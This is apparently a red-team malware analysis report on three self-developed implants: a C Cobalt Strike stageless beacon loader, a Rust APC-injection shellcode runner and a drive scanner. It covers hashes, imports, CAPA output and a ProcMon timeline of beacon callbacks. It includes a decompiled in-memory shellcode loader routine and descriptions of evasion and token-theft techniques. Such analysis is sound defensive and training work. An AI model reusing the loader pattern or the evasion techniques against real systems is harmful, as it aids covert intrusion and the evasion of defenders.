# Cobalt Strike  - Custom Beacon Analysis

## Executive Summary

---

**Task:** Perform complete malware analysis on three self-developed offensive implants written in C and Rust.

## Technical Summary

---

**Sample:** Perform full malware analysis on three self-developed offensive tools:

- `cs_stageless.exe`  Custom Cobalt Strike stageless beacon loader (in-memory C2 implant)
- `scan-drives.exe` Full-drive reconnaissance & file enumeration tool (multi-threaded scanner)
- `rust-shellcode-runner.exe`  Custom Cobalt Strike stageless beacon in rust.

The implant established a fully functional session with the team server within 8–15 seconds, demonstrating robust staging and operational reliability.

**Combined Capability:**
Together, these three tools simulate a complete attack chain:
**Initial Access → In-Memory Execution → Reconnaissance → Exfiltration Prep**

| Tool | Language | Core Technique | Evasion Features | Analysis Outcome |
| --- | --- | --- | --- | --- |
| **Beacon Loader** | C | `VirtualAlloc → memcpy → VirtualProtect → CreateThread` | Zero/minimal imports, RW→RX, jitter, `FreeConsole()` | Shellcode extracted (static + memory), live CS callback confirmed |
| **Drive Scanner** | C | `GetLogicalDrives()` + recursive `FindFirstFileA` | Legitimate API, multi-threaded, no drops | Full system traversal, high-value file discovery (docs, images) |
| **APC Shellcode Runner** | Rust | **Early Bird APC Injection** via `QueueUserAPC` + suspended thread | Bypasses `CreateRemoteThread` hooks, no direct execution, `windows` crate | Very Fast compare to c beacon. |

## Tools Used:

---

| # | Tool Name | Purpose in Your Analysis |
| --- | --- | --- |
| 1 | Pestudio | Imports, Library, entropy |
| 2 | Detect It Easy (DIE) | Compiler, packer, entropy, basic info detection |
| 3 | PE-Bear | Sections, imports, entropy, export selected bytes |
| 4 | CFF Explorer | Detailed PE header and import table analysis |
| 5 | FLOSS | Advanced string extraction (decoded + static) |
| 6 | strings / strings64 | Quick static string dumping |
| 7 | CAPA (Mandiant) | Automatic malicious capability identification |
| 8 | ProcMon (Process Monitor) | Full API call timeline and behavioral logging |
| 9 | Process Hacker 2 | Memory regions, threads, live memory dump, strings tab |
| 10 | x64dbg | Debugger – breakpoints, memory dump, shellcode extraction |
| 11 | Wireshark / FakeNet-NG | Network callback capture (HTTPS staging) |
| 12 | Ghidra | Decompilation, function renaming, payload analysis |
| 13 | YARA | Custom rule creation and testing |
| 14 | Virus Total | Fingeprinting, Scanning |

## Fingerprint

---

### File:  cs_stageless.exe

![Fig-1:  cs_stageless.exe Virus Total Results](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_12.19.51_PM.png)

Fig-1:  cs_stageless.exe Virus Total Results

---

**cs_stageless.exe**

| **Data** | **Value** |
| --- | --- |
| **File Name:** | cs_stageless.exe |
| Category: | Trojan |
| Language: | C |
| Architecture: | 64-Bit |
| SAH256SUM: | e57dc19edc8cbe279b6950bb6c5783d267b605d6dde503170a5450eaee64e0d3 |
| MD5 hash: | 9f3c64d11b9072f6c7ddd538048d5a74  |
| File size: | 314 KB (321,536 bytes) |
| Virtual machine Detection: | FALSE |
| Debugger Detection: | FALSE |
| Internet Connection: | REQUIRED |

---

### File:  rust-shellcode-runner.exe

![rust-shellcode-runner.exe Virus Total Results](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_1.00.33_PM.png)

rust-shellcode-runner.exe Virus Total Results

---

**rust-shellcode-runner.exe**

| **Data** | **Value** |
| --- | --- |
| **File Name:** | rust-shellcode-runner.exe |
| Category: | Trojan |
| Language: | Rust |
| Architecture: | 64-Bit |
| SAH256SUM: | 23f37961565be75650dc3b8d35943ab9d0b5a1fef247ab71353cf8fc9a1e7511 |
| MD5 hash: |    739fd9d9049fb5f532cd39cb2ab3fed5  |
| File size: | 1.57 MB (1,649,867 bytes) |
| Virtual machine Detection: | FALSE |
| Debugger Detection: | FALSE |
| Internet Connection: | REQUIRED |

---

### File: scan-drives.exe

![scan-drives.exe Virus Total Results](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_1.13.05_PM.png)

scan-drives.exe Virus Total Results

---

**scan-drives.exe** 

| **Data** | **Value** |
| --- | --- |
| **File Name:** | scan-drives.exe |
| Category: | N/A |
| Language: | C |
| Architecture: | 64-Bit |
| SAH256SUM: | de969df3226da0dd4c7c0bc6fe4ccf84be101b84a00f448224c92f4c7869352a |
| MD5 hash: | 8dda28f303b6412074941a618ae99b56  |
| File size: | 75.2 KB (77,084 bytes) |
| Virtual machine Detection: | FALSE |
| Debugger Detection: | FALSE |
| Internet Connection: | REQUIRED |

## Surface Analysis

---

### File: cs_stageless.exe

### **Pestudio Analysis**

![Screenshot 2025-11-14 at 1.31.15 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_1.31.15_PM.png)

![cs_stageless.exe Pestudio Results](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_1.35.12_PM.png)

cs_stageless.exe Pestudio Results

### **Detect It Easy Analysis**

![cs_stageless.exe - die entropy analysis](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/die-entropy.png)

cs_stageless.exe - die entropy analysis

entropy is 6. so this binary is not packed.

### **Strings: FLOSS**

![Screenshot 2025-11-14 at 3.47.09 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.47.09_PM.png)

![Screenshot 2025-11-14 at 3.46.53 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.46.53_PM.png)

![Screenshot 2025-11-14 at 3.47.18 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.47.18_PM.png)

---

| Category | APIs You Found | Real-World Malware / Red-Team Purpose |
| --- | --- | --- |
| **Token Theft & Privilege Escalation** | `OpenProcessToken`, `OpenThreadToken`, `AdjustTokenPrivileges`, `LookupPrivilegeValueA`, `ImpersonateLoggedOnUser`, `ImpersonateNamedPipeClient`, `DuplicateTokenEx`, `CreateProcessAsUserA`, `CreateProcessWithTokenW`, `CreateProcessWithLogonW`, `RevertToSelf` | Steal SYSTEM / admin tokens via named pipe impersonation, SeDebugPrivilege, make-token, runas — **classic privilege escalation & lateral movement** |
| **Named Pipe C2 / IPC** | `CreateNamedPipeA`, `ConnectNamedPipe`, `ImpersonateNamedPipeClient`, `WaitNamedPipeA`, `PeekNamedPipe` | **Cobalt Strike, Brute Ratel, Sliver, Mythic** — default SMB / named-pipe beaconing channel |
| **HTTP/S C2 Communication** | `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, etc. | Direct HTTP/S beaconing (your HTTPS Cobalt Strike profile) |
| **Web / Winsock** | `WSASocketA`, `WSAIoctl` | Raw socket usage — often for custom C2 or DNS tunneling |
| **Reflective DLL Injection** | `beacon.x64.dll`, `ReflectiveLoader` | **100% Cobalt Strike Beacon** — confirms this is a real, live, reflective stageless payload |
| **Anti-Analysis / Obfuscation** | `EncodePointer`, `DecodePointer`, `IsDebuggerPresent`, `RtlCaptureContext`, `RtlVirtualUnwind`, `SetUnhandledExceptionFilter` | Hide function pointers, detect debuggers, custom SEH — **standard Cobalt Strike anti-analysis** |
| **Thread & Context Hijacking** | `GetThreadContext`, `SetThreadContext`, `Wow64Get/SetThreadContext`, `RtlLookupFunctionEntry` | Thread hijacking, Early Bird APC, context manipulation — used in modern beacons |
| **Cryptography / Random** | `CryptAcquireContextA`, `CryptGenRandom` | Generate random sleep jitter, encryption keys, UUIDs |
| **File / Environment Ops** | `CreateDirectoryW`, `DeleteFileW`, `SetEnvironmentVariableW`, `GetEnvironmentStringsW` | Staging, persistence, cleanup |
| **Process Creation (Stealth)** | `CreateProcessWithTokenW`, `CreateProcessAsUserA` + ProcThreadAttributeList | PPID spoofing, token-based process creation — **top-tier lateral movement** |
| **System Info & Fingerprinting** | `GetUserNameA`, `LogonUserA`, `GetTokenInformation`, `CheckTokenMembership` | Victim profiling, privilege checks |

### **Definitive Cobalt Strike Beacon Confirmation**

The binary imports a comprehensive set of APIs identical to those used by **Cobalt Strike’s reflective stageless beacon**, including:

- ReflectiveLoader and beacon.x64.dll strings (unique fingerprint)
- Full WININET.dll HTTP/S stack (InternetOpenA → HttpSendRequestA)
- Named pipe impersonation (ImpersonateNamedPipeClient) for SMB beaconing
- Token theft and privileged process creation (CreateProcessWithTokenW, DuplicateTokenEx)
- Anti-analysis via encoded pointers and custom exception handlers
Combined with earlier observed in-memory execution flow, this confirms the payload is a **fully functional, production-grade Cobalt Strike x64 stageless beacon** with multi-channel C2 (HTTP/S + SMB) and post-exploitation capabilities.

### API CALLS

| IMPORTS | TYPE | LIBRARY |
| --- | --- | --- |
| CloseHandle | implicit | KERNEL32.dll |
| CreateThread | implicit | KERNEL32.dll |
| DeleteCriticalSection | implicit | KERNEL32.dll |
| EnterCriticalSection | implicit | KERNEL32.dll |
| FreeConsole | implicit | KERNEL32.dll |
| GetLastError | implicit | KERNEL32.dll |
| GetStartupInfoA | implicit | KERNEL32.dll |
| GetTickCount | implicit | KERNEL32.dll |
| InitializeCriticalSection | implicit | KERNEL32.dll |
| LeaveCriticalSection | implicit | KERNEL32.dll |
| SetUnhandledExceptionFilter | implicit | KERNEL32.dll |
| Sleep | implicit | KERNEL32.dll |
| TlsGetValue | implicit | KERNEL32.dll |
| VirtualAlloc | implicit | KERNEL32.dll |
| VirtualFree | implicit | KERNEL32.dll |
| VirtualProtect | implicit | KERNEL32.dll |
| VirtualQuery | implicit | KERNEL32.dll |
| WaitForSingleObject | implicit | KERNEL32.dll |
| __C_specific_handler | implicit | msvcrt.dll |
| __getmainargs | implicit | msvcrt.dll |
| __initenv | implicit | msvcrt.dll |
| __iob_func | implicit | msvcrt.dll |
| __set_app_type | implicit | msvcrt.dll |
| __setusermatherr | implicit | msvcrt.dll |
| _acmdln | implicit | msvcrt.dll |
| _amsg_exit | implicit | msvcrt.dll |
| _cexit | implicit | msvcrt.dll |
| _commode | implicit | msvcrt.dll |
| _fmode | implicit | msvcrt.dll |
| _initterm | implicit | msvcrt.dll |
| _ismbblead | implicit | msvcrt.dll |
| _onexit | implicit | msvcrt.dll |
| abort | implicit | msvcrt.dll |
| calloc | implicit | msvcrt.dll |
| exit | implicit | msvcrt.dll |
| fprintf | implicit | msvcrt.dll |
| fputs | implicit | msvcrt.dll |
| free | implicit | msvcrt.dll |
| malloc | implicit | msvcrt.dll |
| memcpy | implicit | msvcrt.dll |
| signal | implicit | msvcrt.dll |
| strlen | implicit | msvcrt.dll |
| strncmp | implicit | msvcrt.dll |
| vfprintf | implicit | msvcrt.dll |

---

### Observed API Calls & Their Typical Use in Malware Development

| API Call | Common Malicious Purpose in Implants / Loaders |
| --- | --- |
| **VirtualAlloc** | Allocate memory region for shellcode (RW) |
| **VirtualProtect** | Flip memory from RW → RX to make shellcode executable |
| **VirtualFree** | Clean up memory after execution (anti-forensics) |
| **VirtualQuery** | Check memory region attributes (anti-analysis / sleep masking) |
| **CreateThread** | Execute shellcode in new thread (classic injection) |
| **WaitForSingleObject** | Parent waits for payload thread (keep process alive) |
| **Sleep / GetTickCount** | Simple delay + jitter to evade sandbox timing checks |
| **FreeConsole** | Hide console window → stealth GUI subsystem |
| **CloseHandle** | Close thread/memory handles (cleanup) |
| **GetLastError** | Error handling inside malicious logic |
| **SetUnhandledExceptionFilter** | Install custom SEH to catch crashes and hide malicious activity |
| **Initialize/Enter/Leave/DeleteCriticalSection** | Thread synchronization (multi-threaded beacons, anti-race) |
| **TlsGetValue** | Access Thread Local Storage – often used by beacons to store state |
| **GetStartupInfoA** | Check environment (detect debugger / sandbox) |
| **msvcrt.dll imports** (`__getmainargs`, `__set_app_type`, etc.) | Leftover CRT stubs when not fully statically linked – harmless but slightly increases size |

---

The binary uses a minimal but highly characteristic set of Windows APIs typical of in-memory shellcode loaders and stageless implants. The presence of VirtualAlloc → VirtualProtect → CreateThread combined with FreeConsole and Sleep is a well-known red-team pattern for stealthy payload execution.

### GHIDRA

![Screenshot 2025-11-17 at 4.59.40 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_4.59.40_PM.png)

---

```cpp

undefined8 FUN_140001370(void)

{
  DWORD DVar1;
  BOOL BVar2;
  LPTHREAD_START_ROUTINE lpStartAddress;
  HANDLE hHandle;
  DWORD local_1c [3];
  
  FreeConsole();
  DVar1 = GetTickCount();
  Sleep(DVar1 % 10000 + 5000);
  lpStartAddress =
       (LPTHREAD_START_ROUTINE)VirtualAlloc((LPVOID)0x0,(ulonglong)DAT_140003000,0x3000,4);
  if (lpStartAddress != (LPTHREAD_START_ROUTINE)0x0) {
    memcpy(lpStartAddress,&DAT_140003020,(ulonglong)DAT_140003000);
    BVar2 = VirtualProtect(lpStartAddress,(ulonglong)DAT_140003000,0x20,local_1c);
    if (BVar2 != 0) {
      hHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress,(LPVOID)0x0,0,(LPDWORD)0x0)
      ;
      if (hHandle != (HANDLE)0x0) {
        WaitForSingleObject(hHandle,0xffffffff);
        CloseHandle(hHandle);
        VirtualFree(lpStartAddress,0,0x8000);
        return 0;
      }
    }
    VirtualFree(lpStartAddress,0,0x8000);
  }
  return 1;
}

```

---

Static Analysis – Classic C++ Stageless Beacon Loader

### **Capa Output**

![cs_stageless.exe: capa analysis](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.58.35_PM.png)

cs_stageless.exe: capa analysis

**Memory location**

```powershell
λ capa.exe -vv cs_stageless.exe
md5                     9f3c64d11b9072f6c7ddd538048d5a74
sha1                    f4584a26a47a9e0bf7c4b1c906afac9e44956bbc
sha256                  e57dc19edc8cbe279b6950bb6c5783d267b605d6dde503170a5450eaee64e0d3
path                    C:/Users/redteam/Desktop/project-a/cs_stageless.exe
timestamp               2025-11-14 16:02:24.448105
capa version            9.2.1
os                      windows
format                  pe
arch                    amd64
analysis                static
extractor               VivisectFeatureExtractor
base address            0x140000000
rules                   C:/Users/redteam/AppData/Local/Temp/_MEI36202/rules
function count          67
library function count  0
total feature count     4625

allocate memory (2 matches, only showing first match of library rule)
author  0x534a@mailbox.org, @mr-tz
scope   basic block
mbc     Memory::Allocate Memory [C0007]
basic block @ 0x140001370 in function 0x140002290
  or:
    api: VirtualAlloc @ 0x1400013B9

allocate or change RW memory (3 matches, only showing first match of library rule)
author  0x534a@mailbox.org, @mr-tz
scope   basic block
mbc     Memory::Allocate Memory [C0007]
basic block @ 0x140001370 in function 0x140002290
  and:
    or:
      match: allocate memory @ 0x140001370
        or:
          api: VirtualAlloc @ 0x1400013B9
    or:
      number: 0x4 = PAGE_READWRITE @ 0x1400013AB

change memory protection (4 matches, only showing first match of library rule)
author  @mr-tz
scope   basic block
mbc     Memory::Change Memory Protection [C0008]
basic block @ 0x1400013CB in function 0x140002290
  or:
    api: VirtualProtect @ 0x1400013F5

contain loop (17 matches, only showing first match of library rule)
author  moritz.raabe@mandiant.com
scope   function
function @ 0x140001131
  or:
    characteristic: loop @ 0x140001131

delay execution (5 matches, only showing first match of library rule)
author      michael.hunhoff@mandiant.com, @ramen0x3f
scope       basic block
mbc         Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]
references  https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions,
            https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp
basic block @ 0x140001169 in function 0x140001131
  or:
    and:
      os: windows
      or:
        api: Sleep @ 0x14000116E

reference Base64 string
namespace  data-manipulation/encoding/base64
author     moritz.raabe@mandiant.com
scope      file
att&ck     Defense Evasion::Obfuscated Files or Information [T1027]
mbc        Data::Encode Data::Base64 [C0026.001], Data::Check String [C0019]
regex: /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
  - "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" @ file+0x3E820

contain a thread local storage (.tls) section
namespace  executable/pe/section/tls
author     michael.hunhoff@mandiant.com
scope      file
section: .tls @ 0x140055000

contain an embedded PE file
namespace  executable/subfile/pe
author     moritz.raabe@mandiant.com
scope      file
mbc        Execution::Install Additional Program [B0023]
or:
  count(characteristic(embedded pe)): 1 or more @ file+0x1820

get thread local storage value
namespace  host-interaction/process
author     michael.hunhoff@mandiant.com
scope      function
function @ 0x140001C50
  and:
    api: TlsGetValue @ 0x140001C75

allocate or change RWX memory
namespace  host-interaction/process/inject
author     @mr-tz, mehunhoff@google.com
scope      basic block
mbc        Memory::Allocate Memory [C0007]
basic block @ 0x1400017D7 in function 0x1400016F4
  or:
    basic block:
      and:
        or:
          match: change memory protection @ 0x1400017D7
            or:
              api: VirtualProtect @ 0x140001805
        or:
          number: 0x40 = PAGE_EXECUTE_READWRITE @ 0x1400017E4

create thread (2 matches)
namespace  host-interaction/thread/create
author     moritz.raabe@mandiant.com, michael.hunhoff@mandiant.com, joakim@intezer.com, anushka.virgaonkar@mandiant.com
scope      basic block
mbc        Process::Create Thread [C0038]
basic block @ 0x1400013FF in function 0x140002290
  or:
    and:
      os: windows
      or:
        api: CreateThread @ 0x14000141A
basic block @ 0x1400013FF in function 0x140002290
  or:
    and:
      os: windows
      or:
        api: CreateThread @ 0x14000141A

enumerate PE sections (2 matches)
namespace   load-code/pe
author      @Ana06, @mr-tz
scope       function
mbc         Discovery::Code Discovery::Enumerate PE Sections [B0046.001]
references  https://0x00sec.org/t/reflective-dll-injection/3080,
            https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
function @ 0x140001E74
  and:
    os: windows
    instruction:
      and:
        operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections @ 0x140001E82
        or:
          mnemonic: movzx @ 0x140001E82
    basic block:
      or:
        and: = IMAGE_FIRST_SECTION(nt_header)
          instruction:
            and:
              operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader @ 0x140001E7E
              or:
                mnemonic: movzx @ 0x140001E7E
          operand[1].offset: 0x18 = FileHeader.SizeOfOptionalHeader @ 0x140001E87
    count(basic block): 3 or more @ 0x140001E74, 0x140001E8C, 0x140001E91, 0x140001E9D, and 3 more...
    optional:
      offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew @ 0x140001E77
    not:
      characteristic: nzxor
    2 or more:
      operand[1].offset: 0xC = IMAGE_SECTION_HEADER.VirtualAddress @ 0x140001E91
      operand[1].offset: 0x14 = IMAGE_SECTION_HEADER.PointerToRawData @ 0x140001E7E
function @ 0x140001F21
  and:
    os: windows
    instruction:
      and:
        operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections @ 0x140001E82
        or:
          mnemonic: movzx @ 0x140001E82
    basic block:
      or:
        and: = IMAGE_FIRST_SECTION(nt_header)
          instruction:
            and:
              operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader @ 0x140001E7E
              or:
                mnemonic: movzx @ 0x140001E7E
          operand[1].offset: 0x18 = FileHeader.SizeOfOptionalHeader @ 0x140001E87
    count(basic block): 3 or more @ 0x140001E74, 0x140001E8C, 0x140001E91, 0x140001E9D, and 6 more...
    optional:
      offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew @ 0x140001E77
    not:
      characteristic: nzxor
    2 or more:
      operand[1].offset: 0xC = IMAGE_SECTION_HEADER.VirtualAddress @ 0x140001E91
      operand[1].offset: 0x14 = IMAGE_SECTION_HEADER.PointerToRawData @ 0x140001E7E

parse PE header (2 matches)
namespace  load-code/pe
author     moritz.raabe@mandiant.com
scope      function
att&ck     Execution::Shared Modules [T1129]
function @ 0x140001001
  and:
    os: windows
    and:
      mnemonic: cmp @ 0x140001022, 0x140001043, 0x14000104E, 0x140001055, and 6 more...
      or:
        number: 0x4550 = IMAGE_NT_SIGNATURE (PE) @ 0x140001043
      or:
        number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ) @ 0x140001022
function @ 0x140001E50
  and:
    os: windows
    and:
      mnemonic: cmp @ 0x140001E52, 0x140001E60, 0x140001E6A
      or:
        number: 0x4550 = IMAGE_NT_SIGNATURE (PE) @ 0x140001E60
      or:
        number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ) @ 0x140001E52

```

---

## Dynamic Analysis

---

### Key Event Timeline (Filtered & Analyzed) (ProcMon)

![Screenshot 2025-11-17 at 2.40.24 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_2.40.24_PM.png)

![Screenshot 2025-11-17 at 2.40.57 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-17_at_2.40.57_PM.png)

---

| Time (local) | Event | Details & Significance |
| --- | --- | --- |
| 14:26:26.734 | Process Start | PID 4332, Command line: "C:\Users\redteam\Desktop\project-a\cs_stageless.exe" |
| 14:26:26.745–14:26:38 | Multiple self-ReadFile | Reads own PE sections (offsets 30 720 → 276 480) → extracts embedded reflective shellcode from .exe |
| 14:26:38.112 | Load Image | wininet.dll, ws2_32.dll, cryptsp.dll, rsaenh.dll, bcrypt.dll, bcryptprimitives.dll → full C2 + encryption stack |
| 14:26:38.128 | Thread Create (multiple) | Thread IDs 3404, 4852, 3964, 4552 → shellcode execution threads |
| 14:26:38.209–14:26:38.219 | Registry queries (Internet Settings, ZoneMap, FIPS, Cryptography) | Heavy fingerprinting: IE zones, proxy settings, FIPS mode, crypt providers → anti-sandbox & config gathering |
| 14:26:39.236 | TCP Reconnect | First callback attempt: 49796 → 10.69.27.4:443 (HTTPS) |
| 14:26:41.251 | TCP Reconnect | Second attempt (jitter ≈ 2 s) |
| 14:26:45.251 | TCP Reconnect | Third attempt (jitter ≈ 4 s) |
| 14:26:53.251 | TCP Reconnect | Fourth attempt (jitter ≈ 8 s) |
| 14:26:59.267 | TCP Disconnect | No response from C2 → beacon gives up temporarily |
| 14:27:26–14:27:45 | Thread Exit (all threads) | All beacon threads terminate cleanly |
| 14:27:45 | Process Exit | Zero persistence, zero file drops → fully in-memory execution |

---

### Behavioral Highlights

- **In-memory execution only** – No new files created or modified on disk.
- **Classic Cobalt Strike stageless pattern** – Self-read → reflective load → WinInet + BCrypt stack → jittered HTTPS callbacks.
- **Network activity** – 4 jittered HTTPS reconnects to 10.69.27.4 (your teamserver) with increasing delays (2 s → 8 s).
- **Evasion & fingerprinting** – 100+ registry queries targeting FIPS, Internet Settings, ZoneMap, BAM, Terminal Server keys (typical anti-VM/anti-sandbox checks).
- **Runtime** – 79 seconds (standard for a beacon that fails initial check-in and then sleeps/exits).

### SHELL CODE Extraction - cs_stageless.exe

### Method 1 – Static Extraction (Easiest & Fastest) → PE-Bear

found some traces of shellcode in .data section of cs_stageless.exe.

![pebear - shellcode](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/pe-bear.png)

pebear - shellcode

---

### Method 2 – Dynamic Extraction → Process Hacker

![Screenshot 2025-11-14 at 3.20.10 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.20.10_PM.png)

![Process hacker shellcode extraction](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_3.19.51_PM.png)

Process hacker shellcode extraction

---

### Method 3 – x64dbg

![Screenshot 2025-11-14 at 4.56.16 PM.png](Cobalt%20Strike%20-%20Custom%20Beacon%20Analysis/Screenshot_2025-11-14_at_4.56.16_PM.png)

---

### Execution Flow (Observed in ProcMon + Process Hacker)

| Sequence | API / Event | Observation |
| --- | --- | --- |
| 1 | VirtualAlloc | Allocates ~600 KB RW memory |
| 2 | WriteProcessMemory / memcpy | Copies embedded shellcode into allocated region |
| 3 | VirtualProtect | Changes protection from RW → RX |
| 4 | CreateThread | Starts new thread with StartAddress = shellcode base |
| 5 | Sleep + jitter | 8–15 second delay before first callback |
| 6 | InternetConnectA → HttpSendRequestA | Outbound HTTPS POST to teamserver |

---

## Dynamic & Static Analysis of the Rust Binary

| **Data** | **Value** |
| --- | --- |
| **File Name:** | rust-shellcode-runner.exe |
| Category: | Trojan |
| Language: | Rust |
| Architecture: | 64-Bit |
| SAH256SUM: | 23f37961565be75650dc3b8d35943ab9d0b5a1fef247ab71353cf8fc9a1e7511 |
| MD5 hash: | 739fd9d9049fb5f532cd39cb2ab3fed5 |
| File size: | 1.57 MB (1,649,867 bytes) |
| Virtual machine Detection: | FALSE |
| Debugger Detection: | FALSE |
| Internet Connection: | REQUIRED |

### API CALLS - PEstudio Analysis

---

| IMPORTS | TYPE | LIBRARY |
| --- | --- | --- |
| DeleteCriticalSection | implicit | KERNEL32.dll |
| EnterCriticalSection | implicit | KERNEL32.dll |
| InitializeCriticalSection | implicit | KERNEL32.dll |
| LeaveCriticalSection | implicit | KERNEL32.dll |
| RaiseException | implicit | KERNEL32.dll |
| RtlUnwindEx | implicit | KERNEL32.dll |
| VirtualQuery | implicit | KERNEL32.dll |
| __C_specific_handler | implicit | KERNEL32.dll |
| __getmainargs | implicit | msvcrt.dll |
| __initenv | implicit | msvcrt.dll |
| __iob_func | implicit | msvcrt.dll |
| __set_app_type | implicit | msvcrt.dll |
| __setusermatherr | implicit | msvcrt.dll |
| _amsg_exit | implicit | msvcrt.dll |
| _cexit | implicit | msvcrt.dll |
| _commode | implicit | msvcrt.dll |
| _fmode | implicit | msvcrt.dll |
| _fpreset | implicit | msvcrt.dll |
| _initterm | implicit | msvcrt.dll |
| _onexit | implicit | msvcrt.dll |
| abort | implicit | msvcrt.dll |
| calloc | implicit | msvcrt.dll |
| exit | implicit | msvcrt.dll |
| fprintf | implicit | msvcrt.dll |
| fputs | implicit | msvcrt.dll |
| free | implicit | msvcrt.dll |
| malloc | implicit | msvcrt.dll |
| memcmp | implicit | msvcrt.dll |
| memcpy | implicit | msvcrt.dll |
| memmove | implicit | msvcrt.dll |
| memset | implicit | msvcrt.dll |
| signal | implicit | msvcrt.dll |
| strlen | implicit | msvcrt.dll |
| strncmp | implicit | msvcrt.dll |
| vfprintf | implicit | msvcrt.dll |
| wcslen | implicit | msvcrt.dll |
| NtCreateNamedPipeFile | implicit | ntdll.dll |
| AddVectoredExceptionHandler | implicit | kernel32.dll |
| CancelIo | implicit | kernel32.dll |
| CloseHandle | implicit | kernel32.dll |
| CompareStringOrdinal | implicit | kernel32.dll |
| CopyFileExW | implicit | kernel32.dll |
| CreateDirectoryW | implicit | kernel32.dll |
| CreateEventW | implicit | kernel32.dll |
| CreateFileMappingA | implicit | kernel32.dll |
| CreateFileW | implicit | kernel32.dll |
| CreateHardLinkW | implicit | kernel32.dll |
| CreatePipe | implicit | kernel32.dll |
| CreateProcessW | implicit | kernel32.dll |
| CreateSymbolicLinkW | implicit | kernel32.dll |
| CreateThread | implicit | kernel32.dll |
| CreateToolhelp32Snapshot | implicit | kernel32.dll |
| CreateWaitableTimerExW | implicit | kernel32.dll |
| DeleteFileW | implicit | kernel32.dll |
| DeleteProcThreadAttributeList | implicit | kernel32.dll |
| DeviceIoControl | implicit | kernel32.dll |
| DuplicateHandle | implicit | kernel32.dll |
| ExitProcess | implicit | kernel32.dll |
| FindClose | implicit | kernel32.dll |
| FindFirstFileExW | implicit | kernel32.dll |
| FindNextFileW | implicit | kernel32.dll |
| FlushFileBuffers | implicit | kernel32.dll |
| FormatMessageW | implicit | kernel32.dll |
| FreeEnvironmentStringsW | implicit | kernel32.dll |
| FreeLibrary | implicit | kernel32.dll |
| GetCommandLineW | implicit | kernel32.dll |
| GetConsoleMode | implicit | kernel32.dll |
| GetConsoleOutputCP | implicit | kernel32.dll |
| GetCurrentDirectoryW | implicit | kernel32.dll |
| GetCurrentProcess | implicit | kernel32.dll |
| GetCurrentProcessId | implicit | kernel32.dll |
| GetCurrentThread | implicit | kernel32.dll |
| GetEnvironmentStringsW | implicit | kernel32.dll |
| GetEnvironmentVariableW | implicit | kernel32.dll |
| GetExitCodeProcess | implicit | kernel32.dll |
| GetFileAttributesW | implicit | kernel32.dll |
| GetFileInformationByHandle | implicit | kernel32.dll |
| GetFileInformationByHandleEx | implicit | kernel32.dll |
| GetFileSizeEx | implicit | kernel32.dll |
| GetFileType | implicit | kernel32.dll |
| GetFinalPathNameByHandleW | implicit | kernel32.dll |
| GetFullPathNameW | implicit | kernel32.dll |
| GetLastError | implicit | kernel32.dll |
| GetModuleFileNameW | implicit | kernel32.dll |
| GetModuleHandleA | implicit | kernel32.dll |
| GetModuleHandleW | implicit | kernel32.dll |
| GetOverlappedResult | implicit | kernel32.dll |
| GetProcAddress | implicit | kernel32.dll |
| GetProcessHeap | implicit | kernel32.dll |
| GetProcessId | implicit | kernel32.dll |
| GetStdHandle | implicit | kernel32.dll |
| GetSystemDirectoryW | implicit | kernel32.dll |
| GetSystemInfo | implicit | kernel32.dll |
| GetSystemTimePreciseAsFileTime | implicit | kernel32.dll |
| GetTempPathW | implicit | kernel32.dll |
| GetWindowsDirectoryW | implicit | kernel32.dll |
| HeapAlloc | implicit | kernel32.dll |
| HeapFree | implicit | kernel32.dll |
| HeapReAlloc | implicit | kernel32.dll |
| InitOnceBeginInitialize | implicit | kernel32.dll |
| InitOnceComplete | implicit | kernel32.dll |
| InitializeProcThreadAttributeList | implicit | kernel32.dll |
| LoadLibraryExA | implicit | kernel32.dll |
| LockFileEx | implicit | kernel32.dll |
| MapViewOfFile | implicit | kernel32.dll |
| Module32FirstW | implicit | kernel32.dll |
| Module32NextW | implicit | kernel32.dll |
| MoveFileExW | implicit | kernel32.dll |
| MultiByteToWideChar | implicit | kernel32.dll |
| QueryPerformanceCounter | implicit | kernel32.dll |
